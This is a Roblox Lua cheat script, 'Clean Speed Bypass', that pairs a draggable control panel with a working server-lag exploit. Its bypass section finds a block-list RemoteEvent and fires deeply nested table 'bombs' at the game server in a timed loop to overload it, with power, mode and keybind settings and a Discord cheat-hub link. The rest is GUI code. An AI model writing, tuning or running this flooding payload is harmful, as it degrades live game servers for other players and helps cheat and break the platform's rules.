--[[
	Clean Speed Bypass - Full Functional
]]

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ===== STATE =====
local enabled = false
local autoBrainrot = false
local mode = "PC" -- PC / Mobile
local power = 97000
local boundKey = Enum.KeyCode.V
local waitingForKey = false
local locked = false
local sliderHidden = false
local minimized = false
local uiScale = 0.91
local lagThread = nil
local remote = nil

-- ===== BYPASS =====
local function findRemote()
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	if not rrs then return nil end
	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList"}) do
		local r = rrs:FindFirstChild(name)
		if r and r:IsA("RemoteEvent") then return r end
	end
	for _, c in ipairs(rrs:GetChildren()) do
		if c:IsA("RemoteEvent") and (c.Name:find("Block") or c.Name:find("Player")) then
			return c
		end
	end
	return nil
end

local function buildBomb(pwr, depth)
	local main = {}
	local nested = {{}}
	local z = nested[1]
	for _ = 1, depth do
		local t = {}
		table.insert(z, t)
		z = t
	end
	local reps = math.min(math.floor(pwr / (depth + 2)), 12000)
	for _ = 1, reps do
		table.insert(main, nested)
	end
	return main
end

local function stopBypass()
	enabled = false
	if lagThread then
		pcall(function() task.cancel(lagThread) end)
		lagThread = nil
	end
end

local function startBypass()
	stopBypass()
	if not remote then remote = findRemote() end
	if not remote then return false end

	enabled = true
	local depth = (mode == "PC") and 296 or 200
	local delay = (mode == "PC") and 0.12 or 0.15

	lagThread = task.spawn(function()
		while enabled do
			-- Auto brainrot: only spam if WalkSpeed low
			if autoBrainrot then
				local char = LocalPlayer.Character
				local hum = char and char:FindFirstChildOfClass("Humanoid")
				if not hum or (hum.WalkSpeed or 16) >= 25 then
					task.wait(0.2)
					continue
				end
			end
			local bomb = buildBomb(power, depth)
			pcall(function() remote:FireServer(bomb) end)
			task.wait(delay)
		end
	end)
	return true
end

-- ===== GUI =====
pcall(function()
	if playerGui:FindFirstChild("Clean Speed Bypass") then
		playerGui["Clean Speed Bypass"]:Destroy()
	end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "Clean Speed Bypass"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = playerGui

local Root = Instance.new("Frame")
Root.Name = "Root"
Root.Active = true
Root.Position = UDim2.new(0.5, -138, 0.5, -132)
Root.Size = UDim2.new(0, 240, 0, 260)
Root.BackgroundTransparency = 1
Root.BorderSizePixel = 0
Root.Parent = gui

local RootScale = Instance.new("UIScale")
RootScale.Name = "RootScale"
RootScale.Scale = uiScale
RootScale.Parent = Root

-- Main panel
local Frame = Instance.new("Frame")
Frame.Name = "Frame"
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0, 60, 0, 0)
Frame.Size = UDim2.new(0, 180, 0, 260)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 1
Frame.BorderSizePixel = 0
Frame.Parent = Root
Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 10)

local BackgroundImage = Instance.new("ImageLabel")
BackgroundImage.Name = "BackgroundImage"
BackgroundImage.ZIndex = 0
BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
BackgroundImage.BackgroundTransparency = 1
BackgroundImage.Image = "rbxassetid://101894744159774"
BackgroundImage.ScaleType = Enum.ScaleType.Crop
BackgroundImage.Parent = Frame
Instance.new("UICorner", BackgroundImage).CornerRadius = UDim.new(0, 10)

local BackgroundOverlay = Instance.new("Frame")
BackgroundOverlay.Size = UDim2.new(1, 0, 1, 0)
BackgroundOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BackgroundOverlay.BackgroundTransparency = 0.55
BackgroundOverlay.BorderSizePixel = 0
BackgroundOverlay.Parent = Frame
Instance.new("UICorner", BackgroundOverlay).CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel")
title.ZIndex = 20
title.Position = UDim2.new(0, 5, 0, 4)
title.Size = UDim2.new(1, -35, 0, 16)
title.BackgroundTransparency = 1
title.Text = '<font color="#808080"><b>|</b></font>  Clean Speed Bypass'
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 13
title.Font = Enum.Font.GothamMedium
title.TextXAlignment = Enum.TextXAlignment.Left
title.RichText = true
title.Parent = Frame

local sub = Instance.new("TextLabel")
sub.ZIndex = 20
sub.Position = UDim2.new(0, 5, 0, 19)
sub.Size = UDim2.new(1, -35, 0, 14)
sub.BackgroundTransparency = 1
sub.Text = "discord.gg/cleanhub"
sub.TextColor3 = Color3.fromRGB(180, 180, 180)
sub.TextSize = 10
sub.Font = Enum.Font.Gotham
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.Parent = Frame

local MinimizeBtn = Instance.new("TextButton")
MinimizeBtn.Name = "MinimizeBtn"
MinimizeBtn.ZIndex = 30
MinimizeBtn.Position = UDim2.new(1, -25, 0, 8)
MinimizeBtn.Size = UDim2.new(0, 18, 0, 18)
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MinimizeBtn.BackgroundTransparency = 0.35
MinimizeBtn.BorderSizePixel = 0
MinimizeBtn.Text = "-"
MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeBtn.TextSize = 14
MinimizeBtn.Font = Enum.Font.GothamMedium
MinimizeBtn.AutoButtonColor = false
MinimizeBtn.Parent = Frame
Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(1, 0)

local Content = Instance.new("Frame")
Content.Name = "Content"
Content.ZIndex = 2
Content.ClipsDescendants = true
Content.Position = UDim2.new(0, 0, 0, 42)
Content.Size = UDim2.new(1, 0, 1, -42)
Content.BackgroundTransparency = 1
Content.BorderSizePixel = 0
Content.Parent = Frame

-- Lock / Hide
local LockCapsule = Instance.new("TextButton")
LockCapsule.Name = "LockCapsule"
LockCapsule.ZIndex = 5
LockCapsule.Position = UDim2.new(1, -96, 0, 4)
LockCapsule.Size = UDim2.new(0, 44, 0, 16)
LockCapsule.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
LockCapsule.BackgroundTransparency = 0.5
LockCapsule.BorderSizePixel = 0
LockCapsule.Text = "Lock"
LockCapsule.TextColor3 = Color3.fromRGB(255, 255, 255)
LockCapsule.TextSize = 10
LockCapsule.Font = Enum.Font.GothamMedium
LockCapsule.AutoButtonColor = false
LockCapsule.Parent = Content
Instance.new("UICorner", LockCapsule).CornerRadius = UDim.new(1, 0)

local SliderToggleBtn = Instance.new("TextButton")
SliderToggleBtn.Name = "SliderToggleBtn"
SliderToggleBtn.ZIndex = 5
SliderToggleBtn.Position = UDim2.new(1, -48, 0, 4)
SliderToggleBtn.Size = UDim2.new(0, 44, 0, 16)
SliderToggleBtn.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
SliderToggleBtn.BackgroundTransparency = 0.5
SliderToggleBtn.BorderSizePixel = 0
SliderToggleBtn.Text = "Hide"
SliderToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SliderToggleBtn.TextSize = 10
SliderToggleBtn.Font = Enum.Font.GothamMedium
SliderToggleBtn.AutoButtonColor = false
SliderToggleBtn.Parent = Content
Instance.new("UICorner", SliderToggleBtn).CornerRadius = UDim.new(1, 0)

-- Enable
local enableBtn = Instance.new("TextButton")
enableBtn.ZIndex = 3
enableBtn.Position = UDim2.new(0.05, 0, 0, 22)
enableBtn.Size = UDim2.new(0.9, 0, 0, 32)
enableBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
enableBtn.BackgroundTransparency = 0.35
enableBtn.BorderSizePixel = 0
enableBtn.Text = "Enable"
enableBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
enableBtn.TextSize = 12
enableBtn.Font = Enum.Font.GothamMedium
enableBtn.AutoButtonColor = false
enableBtn.Parent = Content
Instance.new("UICorner", enableBtn).CornerRadius = UDim.new(0, 8)

-- Auto Brainrot
local brainRow = Instance.new("Frame")
brainRow.ZIndex = 3
brainRow.Position = UDim2.new(0.05, 0, 0, 58)
brainRow.Size = UDim2.new(0.9, 0, 0, 30)
brainRow.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
brainRow.BackgroundTransparency = 0.4
brainRow.BorderSizePixel = 0
brainRow.Parent = Content
Instance.new("UICorner", brainRow).CornerRadius = UDim.new(0, 8)

local brainLbl = Instance.new("TextLabel")
brainLbl.ZIndex = 4
brainLbl.Size = UDim2.new(0.6, 0, 1, 0)
brainLbl.BackgroundTransparency = 1
brainLbl.Text = "Auto Brainrot"
brainLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
brainLbl.TextSize = 10
brainLbl.Font = Enum.Font.GothamMedium
brainLbl.TextXAlignment = Enum.TextXAlignment.Left
brainLbl.Parent = brainRow
Instance.new("UIPadding", brainLbl).PaddingLeft = UDim.new(0, 10)

local brainBtn = Instance.new("TextButton")
brainBtn.ZIndex = 4
brainBtn.Position = UDim2.new(0.6, 0, 0.15, 0)
brainBtn.Size = UDim2.new(0.35, 0, 0.7, 0)
brainBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
brainBtn.BackgroundTransparency = 0.35
brainBtn.BorderSizePixel = 0
brainBtn.Text = "OFF"
brainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
brainBtn.TextSize = 11
brainBtn.Font = Enum.Font.GothamMedium
brainBtn.AutoButtonColor = false
brainBtn.Parent = brainRow
Instance.new("UICorner", brainBtn).CornerRadius = UDim.new(0, 6)

-- Mode
local modeRow = Instance.new("Frame")
modeRow.ZIndex = 3
modeRow.Position = UDim2.new(0.05, 0, 0, 94)
modeRow.Size = UDim2.new(0.9, 0, 0, 30)
modeRow.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
modeRow.BackgroundTransparency = 0.4
modeRow.BorderSizePixel = 0
modeRow.Parent = Content
Instance.new("UICorner", modeRow).CornerRadius = UDim.new(0, 8)

local modeLbl = Instance.new("TextLabel")
modeLbl.ZIndex = 4
modeLbl.Size = UDim2.new(0.6, 0, 1, 0)
modeLbl.BackgroundTransparency = 1
modeLbl.Text = "Mode"
modeLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
modeLbl.TextSize = 10
modeLbl.Font = Enum.Font.GothamMedium
modeLbl.TextXAlignment = Enum.TextXAlignment.Left
modeLbl.Parent = modeRow
Instance.new("UIPadding", modeLbl).PaddingLeft = UDim.new(0, 10)

local mobileBtn = Instance.new("TextButton")
mobileBtn.ZIndex = 4
mobileBtn.Position = UDim2.new(0.6, 0, 0.15, 0)
mobileBtn.Size = UDim2.new(0.18, 0, 0.7, 0)
mobileBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mobileBtn.BackgroundTransparency = 0.35
mobileBtn.BorderSizePixel = 0
mobileBtn.Text = "Mobile"
mobileBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
mobileBtn.TextSize = 9
mobileBtn.Font = Enum.Font.GothamMedium
mobileBtn.AutoButtonColor = false
mobileBtn.Parent = modeRow
Instance.new("UICorner", mobileBtn).CornerRadius = UDim.new(0, 6)

local pcBtn = Instance.new("TextButton")
pcBtn.ZIndex = 4
pcBtn.Position = UDim2.new(0.79, 0, 0.15, 0)
pcBtn.Size = UDim2.new(0.18, 0, 0.7, 0)
pcBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
pcBtn.BorderSizePixel = 0
pcBtn.Text = "PC"
pcBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
pcBtn.TextSize = 9
pcBtn.Font = Enum.Font.GothamMedium
pcBtn.AutoButtonColor = false
pcBtn.Parent = modeRow
Instance.new("UICorner", pcBtn).CornerRadius = UDim.new(0, 6)

-- Power
local powerRow = Instance.new("Frame")
powerRow.ZIndex = 3
powerRow.Position = UDim2.new(0.05, 0, 0, 130)
powerRow.Size = UDim2.new(0.9, 0, 0, 30)
powerRow.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
powerRow.BackgroundTransparency = 0.4
powerRow.BorderSizePixel = 0
powerRow.Parent = Content
Instance.new("UICorner", powerRow).CornerRadius = UDim.new(0, 8)

local powerLbl = Instance.new("TextLabel")
powerLbl.ZIndex = 4
powerLbl.Size = UDim2.new(0.6, 0, 1, 0)
powerLbl.BackgroundTransparency = 1
powerLbl.Text = "Power"
powerLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
powerLbl.TextSize = 10
powerLbl.Font = Enum.Font.GothamMedium
powerLbl.TextXAlignment = Enum.TextXAlignment.Left
powerLbl.Parent = powerRow
Instance.new("UIPadding", powerLbl).PaddingLeft = UDim.new(0, 10)

local powerBox = Instance.new("TextBox")
powerBox.ZIndex = 4
powerBox.Position = UDim2.new(0.55, 0, 0.15, 0)
powerBox.Size = UDim2.new(0.4, 0, 0.7, 0)
powerBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
powerBox.BackgroundTransparency = 0.35
powerBox.BorderSizePixel = 0
powerBox.Text = tostring(power)
powerBox.TextColor3 = Color3.fromRGB(255, 255, 255)
powerBox.TextSize = 12
powerBox.Font = Enum.Font.GothamMedium
powerBox.ClearTextOnFocus = false
powerBox.Parent = powerRow
Instance.new("UICorner", powerBox).CornerRadius = UDim.new(0, 6)

-- Keybind
local keyRow = Instance.new("Frame")
keyRow.ZIndex = 3
keyRow.Position = UDim2.new(0.05, 0, 0, 166)
keyRow.Size = UDim2.new(0.9, 0, 0, 30)
keyRow.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
keyRow.BackgroundTransparency = 0.4
keyRow.BorderSizePixel = 0
keyRow.Parent = Content
Instance.new("UICorner", keyRow).CornerRadius = UDim.new(0, 8)

local keyLbl = Instance.new("TextLabel")
keyLbl.ZIndex = 4
keyLbl.Size = UDim2.new(0.6, 0, 1, 0)
keyLbl.BackgroundTransparency = 1
keyLbl.Text = "Keybind"
keyLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
keyLbl.TextSize = 10
keyLbl.Font = Enum.Font.GothamMedium
keyLbl.TextXAlignment = Enum.TextXAlignment.Left
keyLbl.Parent = keyRow
Instance.new("UIPadding", keyLbl).PaddingLeft = UDim.new(0, 10)

local keyBtn = Instance.new("TextButton")
keyBtn.ZIndex = 4
keyBtn.Position = UDim2.new(0.55, 0, 0.15, 0)
keyBtn.Size = UDim2.new(0.4, 0, 0.7, 0)
keyBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
keyBtn.BackgroundTransparency = 0.35
keyBtn.BorderSizePixel = 0
keyBtn.Text = "V"
keyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
keyBtn.TextSize = 12
keyBtn.Font = Enum.Font.GothamMedium
keyBtn.AutoButtonColor = false
keyBtn.Parent = keyRow
Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0, 6)

-- Size Slider (left)
local SliderGroup = Instance.new("Frame")
SliderGroup.Name = "SliderGroup"
SliderGroup.Position = UDim2.new(0, 0, 0, 25)
SliderGroup.Size = UDim2.new(0, 50, 0, 180)
SliderGroup.BackgroundTransparency = 1
SliderGroup.BorderSizePixel = 0
SliderGroup.Parent = Root

local SizeSlider = Instance.new("Frame")
SizeSlider.Name = "SizeSlider"
SizeSlider.ClipsDescendants = true
SizeSlider.Size = UDim2.new(1, 0, 1, 0)
SizeSlider.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SizeSlider.BackgroundTransparency = 0.15
SizeSlider.BorderSizePixel = 0
SizeSlider.Parent = SliderGroup
Instance.new("UICorner", SizeSlider).CornerRadius = UDim.new(0, 10)

local scaleLbl = Instance.new("TextLabel")
scaleLbl.Position = UDim2.new(0, 0, 0, 8)
scaleLbl.Size = UDim2.new(1, 0, 0, 20)
scaleLbl.BackgroundTransparency = 1
scaleLbl.Text = "91"
scaleLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
scaleLbl.TextSize = 13
scaleLbl.Font = Enum.Font.GothamMedium
scaleLbl.Parent = SizeSlider

local track = Instance.new("Frame")
track.Position = UDim2.new(0.5, -5, 0, 42)
track.Size = UDim2.new(0, 10, 0, 120)
track.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
track.BorderSizePixel = 0
track.Parent = SizeSlider
Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

local fill = Instance.new("Frame")
fill.ZIndex = 2
fill.Position = UDim2.new(0.5, -5, 0, 107)
fill.Size = UDim2.new(0, 10, 0, 54)
fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fill.BorderSizePixel = 0
fill.Parent = SizeSlider
Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

local knob = Instance.new("TextButton")
knob.ZIndex = 3
knob.Position = UDim2.new(0.5, -10, 0, 97)
knob.Size = UDim2.new(0, 20, 0, 20)
knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
knob.BorderSizePixel = 0
knob.Text = ""
knob.AutoButtonColor = false
knob.Parent = SizeSlider
Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

-- ===== LOGIC =====
local function updateEnable()
	if enabled then
		enableBtn.Text = "Disable"
		enableBtn.BackgroundColor3 = Color3.fromRGB(30, 80, 40)
	else
		enableBtn.Text = "Enable"
		enableBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
	end
end

local function setEnabled(state)
	if state then
		local ok = startBypass()
		if not ok then
			enabled = false
			updateEnable()
			return
		end
	else
		stopBypass()
	end
	updateEnable()
end

enableBtn.MouseButton1Click:Connect(function()
	setEnabled(not enabled)
end)

brainBtn.MouseButton1Click:Connect(function()
	autoBrainrot = not autoBrainrot
	brainBtn.Text = autoBrainrot and "ON" or "OFF"
	brainBtn.BackgroundColor3 = autoBrainrot and Color3.fromRGB(30, 80, 40) or Color3.fromRGB(0, 0, 0)
end)

local function setMode(m)
	mode = m
	if m == "PC" then
		pcBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		pcBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
		mobileBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		mobileBtn.BackgroundTransparency = 0.35
		mobileBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	else
		mobileBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		mobileBtn.BackgroundTransparency = 0
		mobileBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
		pcBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		pcBtn.BackgroundTransparency = 0.35
		pcBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	end
	if enabled then setEnabled(true) end
end

pcBtn.MouseButton1Click:Connect(function() setMode("PC") end)
mobileBtn.MouseButton1Click:Connect(function() setMode("Mobile") end)

powerBox.FocusLost:Connect(function()
	local n = tonumber(powerBox.Text)
	if n and n > 0 then
		power = math.floor(n)
		powerBox.Text = tostring(power)
		if enabled then setEnabled(true) end
	else
		powerBox.Text = tostring(power)
	end
end)

keyBtn.MouseButton1Click:Connect(function()
	if waitingForKey then return end
	waitingForKey = true
	keyBtn.Text = "..."
end)

LockCapsule.MouseButton1Click:Connect(function()
	locked = not locked
	LockCapsule.Text = locked and "Unlock" or "Lock"
	LockCapsule.BackgroundColor3 = locked and Color3.fromRGB(180, 120, 40) or Color3.fromRGB(120, 120, 120)
end)

SliderToggleBtn.MouseButton1Click:Connect(function()
	sliderHidden = not sliderHidden
	SliderGroup.Visible = not sliderHidden
	SliderToggleBtn.Text = sliderHidden and "Show" or "Hide"
end)

MinimizeBtn.MouseButton1Click:Connect(function()
	minimized = not minimized
	Content.Visible = not minimized
	Frame.Size = minimized and UDim2.new(0, 180, 0, 40) or UDim2.new(0, 180, 0, 260)
	MinimizeBtn.Text = minimized and "+" or "-"
end)

UserInputService.InputBegan:Connect(function(input, gpe)
	if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode ~= Enum.KeyCode.Escape then
			boundKey = input.KeyCode
			keyBtn.Text = boundKey.Name
		end
		waitingForKey = false
		return
	end
	if not gpe and input.KeyCode == boundKey then
		setEnabled(not enabled)
	end
end)

-- Scale slider
local function setScale(s)
	uiScale = math.clamp(s, 0.5, 1.2)
	RootScale.Scale = uiScale
	scaleLbl.Text = tostring(math.floor(uiScale * 100))
	local t = 1 - ((uiScale - 0.5) / 0.7)
	local y = 42 + t * 100
	knob.Position = UDim2.new(0.5, -10, 0, y - 10)
	fill.Position = UDim2.new(0.5, -5, 0, y)
	fill.Size = UDim2.new(0, 10, 0, 162 - y)
end

local sliding = false
knob.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		sliding = true
	end
end)
UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		sliding = false
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if sliding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local rel = SizeSlider.AbsolutePosition.Y + 42
		local h = 120
		local t = math.clamp((input.Position.Y - rel) / h, 0, 1)
		setScale(1.2 - t * 0.7)
	end
end)

-- Drag
local dragging, dragStart, startPos
Frame.InputBegan:Connect(function(input)
	if locked then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = Root.Position
	end
end)
UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if locked or not dragging then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		local d = input.Position - dragStart
		Root.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
	end
end)

remote = findRemote()
setScale(uiScale)
setMode("PC")
updateEnable()
print("[Clean Speed Bypass] Loaded")
